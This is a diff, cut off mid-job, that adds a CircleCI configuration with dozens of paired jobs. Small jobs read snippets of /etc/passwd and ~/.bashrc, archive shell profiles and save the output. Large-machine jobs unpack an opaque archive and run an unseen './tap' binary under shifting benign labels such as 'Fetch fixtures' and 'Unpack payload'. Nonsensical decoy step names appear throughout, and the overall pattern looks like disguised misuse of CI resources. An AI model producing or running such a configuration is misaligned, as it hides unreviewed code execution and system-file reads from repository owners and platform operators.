@@ -1,0 +1,1533 @@
+version: 2.1
+
+jobs:
+  COUNTRY_CELL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Inspect
+          command: |
+            mkdir -p /tmp/shard-02
+            set +o pipefail 2>/dev/null; head -c 500000 /dev/urandom | tr -dc 'A-F0-9' | fold -w 16 > /tmp/shard-02/COBALT_HARBOR_MOLTEN; true
+            echo "stage=BUILD_STG ok b=$(wc -c </tmp/shard-02/COBALT_HARBOR_MOLTEN)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'COBALT_HARBOR_MOLTEN'
+  BUILD_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  encryptOkMutex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Verify the new hires by payroll cutoff
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; command grep --line-number 'cache size' /proc/cpuinfo | sort | uniq -c; true ; } > /tmp/shard-02/TXN-2025-61922
+            echo "stage=q2-rev ok b=$(wc -c </tmp/shard-02/TXN-2025-61922)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'TXN-2025-61922'
+  q2-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  DDZ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Checkpoint J build
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; find /tmp -type l -not -name '*' -exec basename {} \; 2>/dev/null|xargs ls -ld; true ; } > /tmp/shard-02/trace-31b1d2.log
+            echo "stage=java17-cov ok b=$(wc -c </tmp/shard-02/trace-31b1d2.log)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'trace-31b1d2.log'
+  java17-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  PI2D:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: warmup state paused
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; grep -n -m 2 if ~/.bashrc | sort | uniq -c; true ; } > /tmp/shard-02/CRISP
+            echo "stage=depoly-46 ok b=$(wc -c </tmp/shard-02/CRISP)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'CRISP'
+  depoly-46:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/CRISP 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  fred_r:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Drying for the cell lines
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; printf '[%s]\n' sam iris grace nina; true ; } > /tmp/shard-02/IMG_86721
+            echo "stage=canary-v3 ok b=$(wc -c </tmp/shard-02/IMG_86721)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'IMG_86721'
+  canary-v3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/IMG_86721 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  uniform_yankee:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Wait for the search box to vanish
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; printf '%#x\n' 34144; true ; } > /tmp/shard-02/audit-5e9be8.log
+            echo "stage=VERIFY_LAB ok b=$(wc -c </tmp/shard-02/audit-5e9be8.log)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'audit-5e9be8.log'
+  VERIFY_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/audit-5e9be8.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  UIMutableRandom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Here we onboard the timesheets
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; ls /usr/sbin | tac | awk '{print length, $0}'; true ; } > /tmp/shard-02/batch_441
+            echo "stage=xray ok b=$(wc -c </tmp/shard-02/batch_441)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'batch_441'
+  xray:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/batch_441 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  persistant_middleware:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: ticket 5d3ff
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; tar --exclude=\*.sh -czf '/tmp/array.tar.gz' -C /etc profile.d && tar -tzf '/tmp/array.tar.gz' | head -n 5; true ; } > /tmp/shard-02/97db6b9a26c
+            echo "stage=add-webhook-hang ok b=$(wc -c </tmp/shard-02/97db6b9a26c)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - '97db6b9a26c'
+  add-webhook-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/97db6b9a26c 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  PsES:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Then we back up the partitions
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'renew passport' | wc -c; true ; } > /tmp/shard-02/release.7.14
+            echo "stage=kilo-7 ok b=$(wc -c </tmp/shard-02/release.7.14)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'release.7.14'
+  kilo-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  worker-8241:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Booking in Dallas
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; ls -it /bin/b*|uniq; true ; } > /tmp/shard-02/desert.teal.matrix.ridge
+            echo "stage=feat-488 ok b=$(wc -c </tmp/shard-02/desert.teal.matrix.ridge)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'desert.teal.matrix.ridge'
+  feat-488:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/desert.teal.matrix.ridge 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  ROOK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: spin culture plates maybe
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; \grep -swh 'fi' ~/.bashrc| wc -l; true ; } > /tmp/shard-02/0659658e50816573fe4ff280d7c32
+            echo "stage=bob-smoke ok b=$(wc -c </tmp/shard-02/0659658e50816573fe4ff280d7c32)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - '0659658e50816573fe4ff280d7c32'
+  bob-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/0659658e50816573fe4ff280d7c32 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  MustArg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: gotta stage the hazmat shelf
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; ulimit -a; true ; } > /tmp/shard-02/GPU-zeta
+            echo "stage=send-it ok b=$(wc -c </tmp/shard-02/GPU-zeta)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'GPU-zeta'
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/GPU-zeta 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  verifyimage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Keep the hotfix branch as is
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; date --date "@1700000000" +"%k"; true ; } > /tmp/shard-02/deb4051e-7cb5-2657-a26a-813f1bc5d7
+            echo "stage=q4-release ok b=$(wc -c </tmp/shard-02/deb4051e-7cb5-2657-a26a-813f1bc5d7)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'deb4051e-7cb5-2657-a26a-813f1bc5d7'
+  q4-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  q4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Blame the shift lead
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; cut -c1-25 ~/.bashrc | tr a-z A-Z | wc -w; true ; } > /tmp/shard-02/sample-77b
+            echo "stage=test ok b=$(wc -c </tmp/shard-02/sample-77b)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'sample-77b'
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/sample-77b 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  pill__desc__outline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Timeout 25s on the event store
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; factor 156671; true ; } > /tmp/shard-02/scratch-fd1ad1df
+            echo "stage=succes-only-9 ok b=$(wc -c </tmp/shard-02/scratch-fd1ad1df)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'scratch-fd1ad1df'
+  succes-only-9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/scratch-fd1ad1df 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  cloaky:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Tidy up the edge nodes
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; type -P ls; true ; } > /tmp/shard-02/mbz4ukt4h
+            echo "stage=canary-v5 ok b=$(wc -c </tmp/shard-02/mbz4ukt4h)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'mbz4ukt4h'
+  canary-v5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/mbz4ukt4h 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  aud_6_12_40:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Maximise the back button after tea
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; head -n 8 /etc/passwd|cut -d":" -f1,7; true ; } > /tmp/shard-02/2016-10-23T14-37
+            echo "stage=yuki-ci ok b=$(wc -c </tmp/shard-02/2016-10-23T14-37)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - '2016-10-23T14-37'
+  yuki-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/2016-10-23T14-37 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  CURC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: spin up and freeze
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; ls /dev/tty[0-9] | pr -3 -t; true ; } > /tmp/shard-02/URI
+            echo "stage=v5-ga ok b=$(wc -c </tmp/shard-02/URI)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'URI'
+  v5-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  xY9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Sanitise the blog post whilst idle
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; nl /etc/skel/.profile|rev|sort; true ; } > /tmp/shard-02/oTtErdRAfTCEDaR
+            echo "stage=STAGE_QA ok b=$(wc -c </tmp/shard-02/oTtErdRAfTCEDaR)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'oTtErdRAfTCEDaR'
+  STAGE_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/oTtErdRAfTCEDaR 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  LANG_TL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Step Five
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; echo cairo hanoi manila rome tokyo quito | tr ' ' '\n' | shuf -n 4 | tac | awk '{print toupper(substr($0,1,1)) substr($0,2)}'; true ; } > /tmp/shard-02/19.169
+            echo "stage=sanity ok b=$(wc -c </tmp/shard-02/19.169)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - '19.169'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/19.169 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  BIT9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: retrospective
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; [ ! -f /etc/passwd ] && echo yes || echo no; true ; } > /tmp/shard-02/crash.log.29
+            echo "stage=fire-up ok b=$(wc -c </tmp/shard-02/crash.log.29)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'crash.log.29'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/crash.log.29 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  candle_gradient_socket_total:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Operation Final Tunnel
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; compgen -b | fmt -w 41 | wc -l; true ; } > /tmp/shard-02/c847b37e-d462
+            echo "stage=hu-run ok b=$(wc -c </tmp/shard-02/c847b37e-d462)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'c847b37e-d462'
+  hu-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/c847b37e-d462 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  E3E422:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: LAB6 Enforcement
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; tar -zcf "/var/tmp/cell_theme.tar.gz" -C $HOME .bashrc && tar -tzf "/var/tmp/cell_theme.tar.gz"; true ; } > /tmp/shard-02/fnv_704e5946
+            echo "stage=wip-router-v2-redirect ok b=$(wc -c </tmp/shard-02/fnv_704e5946)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'fnv_704e5946'
+  wip-router-v2-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/fnv_704e5946 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  zack-driver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Checkpoint B reminder
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; grep -R export /etc/profile.d 2>/dev/null | nl | head -n 8; true ; } > /tmp/shard-02/RPC_351b9.74
+            echo "stage=Validate_Tests6 ok b=$(wc -c </tmp/shard-02/RPC_351b9.74)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'RPC_351b9.74'
+  Validate_Tests6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/RPC_351b9.74 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  pSignalOffsetTuple:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: CENTRIFUGE ENZYME MIX ASAP
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; for x in cat zebra frog lion dog whale; do echo "item: ${x}"; done; true ; } > /tmp/shard-02/fnv_1f9622
+            echo "stage=hotfix-4543 ok b=$(wc -c </tmp/shard-02/fnv_1f9622)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'fnv_1f9622'
+  hotfix-4543:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/trace-31b1d2.log 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 1 -q --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: bunzip2 -c main-data-final.tar.bz2 | tar xf -
+      - run:
+          command: "./tap"
+  fs6zq3l:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Yeet podcast episode
+          command: |
+            mkdir -p /tmp/shard-02
+            { set +o pipefail 2>/dev/null; seq 6 | shuf | head --lines=3; true ; } > /tmp/shard-02/batch_404
+            echo "stage=fix-router ok b=$(wc -c </tmp/shard-02/batch_404)"
+      - persist_to_workspace:
+          root: /tmp/shard-02
+          paths:
+            - 'batch_404'
+  fix-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/shard-02
+      - run:
+          name: Inspect
+          command: |
+            sed 's/[[:space:]]//g' /tmp/shard-02/batch_404 2>/dev/null | wc -c || true
+      - run:
+          name: Retrieve tree
